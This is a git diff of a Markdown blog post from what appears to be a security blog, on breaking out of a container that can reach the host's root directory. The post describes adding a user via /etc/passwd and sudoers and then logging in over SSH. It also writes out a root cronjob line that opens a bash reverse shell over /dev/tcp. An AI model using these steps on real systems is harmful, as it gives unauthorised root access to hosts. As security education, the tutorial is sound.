@@ -1,35 +1,47 @@
 ---
-title: "Container Breakouts – Part 1: Access to root filesystem of the Host"
-date: 2020-07-12T10:39:10+02:00
-draft: true
+title: "Container Breakouts – Part 1: Access to root directory of the Host"
+date: 2020-07-15T08:39:10+02:00
+draft: false
+tags:
+- docker
+- breakout
+- security
 ---
 
-This post is part of a series and shows container breakout techniques that can be performed if a container is started with access to the host root filesystem.
+This post is part of a series and shows container breakout techniques that can be performed if a container is started with access to the host root directory.
 
 <!--more-->
 
-Following posts are part of the series:
-- Part 1: Access to root filesystem of the Host
+The following posts will be part of the series:
+- Part 1: Access to root directory of the Host
+- Part 2: Privileged Container
+- Part 3: Docker Socket
+
+<!--
+The following posts are part of the series:
+- Part 1: Access to root directory of the Host
 - [Part 2: Privileged Container](../container-breakouts-part2)
 - [Part 3: Docker Socket](../container-breakouts-part3)
-
+-->
 ## Intro
 
-The motivation of this post is to collect container breakouts. I was considering writing a huge post about all the stuff you must know to break out of container. But, if I would do so, it will take ages to write, es well to read and at the end you would just scroll direct to the PoC code snippets. So I dropped that idea and will just link to additional readings.
+The **motivation** of this post is to **collect container breakouts**. I was considering writing a huge post about all the stuff you must know to break out of container. But, if I would do so, it will take ages to write, es well to read and at the end you would just scroll direct to the PoC code snippets. So I dropped that idea and will just link to additional readings.
 
-As well, I realized during writing that the post must be sliced into digestible pieces. 
+I also realized during writing that the post must be sliced into more digestible pieces. 
 
-The first post is about what could probably go wrong if the host root filesystem is accessible from the container. Do to the fact that we have only access to the disc, this approach is absolutely not an OpSec-safe approach to escalate your privileges. 
+The **first post** is **about** what could probably go wrong if the **host root directory** is **accessible** from the container. Due to the fact that we have only access to the disc, this approach is absolutely not an OpSec-safe approach to escalate your privileges. 
 
-## Shared Host root-directory
+The proposed techniques use Unix operating system features that are more system security related, then container security related. But, as part of a comprehensive series it has to take place to show the importance.
 
-If you got access to a container that shares directories with the host, that is not direct a problem. But, if the container has access to the host root-filesystem as user root (pre-assumed that there is no [AppArmor](https://man.cx/apparmor(7)) or [SELinux](https://man7.org/linux/man-pages/man8/selinux.8.html) in place) you got the jack pot! We have multiple ways to approach the underlying host.
+## Shared Host root directory
+
+Access to a container that shares directories with the host is **not** an **immediate problem**. **But** if the container has **access to** the **host root directory** as user `root` (pre-assumed that there is no [AppArmor](https://man.cx/apparmor(7)) or [SELinux](https://man7.org/linux/man-pages/man8/selinux.8.html) in place) you hit the jack pot! We have multiple ways to approach the underlying host.
 
 Let’s assume that the host root directory is accessible at `/hostfs`
 
 ### SSH to user
 
-To escalate to the host, we **create a user** in the file `/hostfs/etc/passwd` and **add** the user **to** the **sudoer’s**. After the user is prepared, we connect via **SSH** to the host. Okay, it is a kind of constructed, because certain packages must have been installed and services running, but you get the idea.
+To escalate to the host, we **create a user** in the file `/hostfs/etc/passwd` and **add** the user **to** the **sudoer** group. After the user is created, we connect via **SSH** to the host. Admittedly, it is a kind of constructed, because certain packages must have been installed and services running, but you get the idea.
 
 Here are all steps that must be performed (we start in the container).
 
@@ -56,17 +68,17 @@ arch [~]% sudo -i
 [arch ~]# 
 ```
 
-We have assumed that there is an SSH daemon running on the host, the service is not hardened and the `sudo` package was installed. Well, you could exchange the sudo-step by creating another user with `uid=0(root)` to get rid of that step, but anyway.
+For this scenario, the SSH daemon is running on the host, the configuration is not hardened and the `sudo` package is installed. The sudo step can be exchanged by creating another user with `uid=0(root)`. Another option would be the creation of SSH keys for existing users.
 
 ### Cronjob
 
-Due to the fact that in a default setup the container is direct connected to the host, we can initiate not only connections from the container to the host, also vice-versa. To do so, we need the IP address from the container. Depending on the binaries that are available on the host, we initiate a reverse shell by a cronjob that connects to an exposed port on the container. In this showcase, we use `bash` for the reverse connection and `netcat` to handle the connection in the container. The following line is all we need:
+Due to the fact that in a default setup the container is **direct connected to the host**, we can initiate not only connections from the container to the host, also vice-versa. To do so, we need the IP address from the container. Depending on the binaries that are available on the host, we initiate a **reverse shell by** a **cronjob** that connects to an exposed port on the container. In this showcase, we use `bash` for the reverse connection and `netcat` to handle the connection in the container. The following line is all we need:
 
 ```
 * * * * * root bash -i >& /dev/tcp/$CONTAINER_IP/$CONTAINER_PORT 0>&1
 ```
 
-The cronjob is executed every minute as user `root` on the host. So, as soon as the cronjob gets trigger, we are getting root access to the host system. 
+The **cronjob** is executed **every minute** as user `root` on the host. So, as soon as the cronjob gets trigger, we are getting **root access to** the **host** system. 
 
 Here are all steps that must be performed (we start in the container).
 
@@ -94,9 +106,15 @@ In this second showcase, we assumed that a cron service was running on the host.
 
 ## Conclusion
 
-Both examples are approaches to get direct access to host system. They are modifying the host and absolutely not minimal-inversive or OpSec-safe. If you make mistakes, you may mix up the configuration of the host system and crash it. Be careful!
+Both examples are approaches to get direct access to host system. They are modifying the host and **absolutely not minimal-inversive or OpSec-safe**. If you **make mistakes**, you may mix up the configuration of the **host system** and **crash** it. **Be careful !!**
 
-Furthermore, the proposed techniques are possible approaches to escape out of a container. I may update the list from time-to-time. If you have important approaches that you think they should be listed, do not hesitate and get in touch.
+Furthermore, the proposed techniques are possible approaches to escape out of a container if one has access to the host root directory. By the nature of this attack vector, it is more a general Unix privileges escalation technique, then a dedicated container breakout.
 
-If you are interested in further, less riotous continue with the next post [Container Breakouts – Part 2: Privileged Container](../container-breakouts-part2).
+I may update the list from time-to-time. If you have important approaches that you think they should be listed, do not hesitate and get in touch.
+
+If you are interested in further, less riotous techniques stay tuned for the next post _**Container Breakouts – Part 2: Privileged Container**_.
+<!--
+If you are interested in further, less riotous techniques continue with the next post [Container Breakouts – Part 2: Privileged Container](../container-breakouts-part2).
+-->
+
 
